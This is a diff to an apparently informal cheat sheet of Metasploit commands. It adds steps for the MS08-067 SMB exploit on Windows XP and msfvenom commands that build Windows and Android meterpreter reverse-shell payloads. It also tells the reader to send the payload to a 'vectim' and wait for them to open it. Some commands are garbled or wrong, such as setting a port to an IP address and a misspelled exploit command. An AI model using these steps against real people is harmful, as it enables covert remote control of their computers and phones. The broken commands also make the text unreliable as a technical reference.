@@ -1,7 +1,27 @@
+## Windows 
+## works with windows xp home sp1 only
+msfconsole
 search netapi
 use exploit/windows/smb/ms08_067_netapi
 set rhost <ip of pc>
 show options # needed to check rhost
-expolite #gl
+expolit #gl
 
-## works with windows xp home sp1 only
+## For windows 7/8/10
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your local ip> R > /root/payload.exe
+#now send that payload.exe to vectim's pc
+msfconsole
+use exploit/windows/smb/ms08_067_netapi
+set payload windows/meterpreter/reverse_tcp
+set lport <your ip>
+exploit # and wait for him to come online 
+
+## For android
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=<Your local ip> R > /root/payload.apk
+#send apk to him
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set lport <your ip>
+exploit # and wait for him to click app
